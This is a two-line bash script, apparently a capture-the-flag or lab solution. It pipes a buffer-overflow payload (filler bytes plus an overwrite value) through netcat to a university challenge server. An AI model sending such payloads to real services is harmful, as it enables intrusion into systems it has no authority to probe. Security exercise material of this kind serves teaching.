#!/bin/bash

python3 -c "import sys; sys.stdout.buffer.write(b'abcdefgh' + b'x' * 0x28 + b'abcdefgh' + b'\n')" | nc mustard.stt.rnl.tecnico.ulisboa.pt 23161
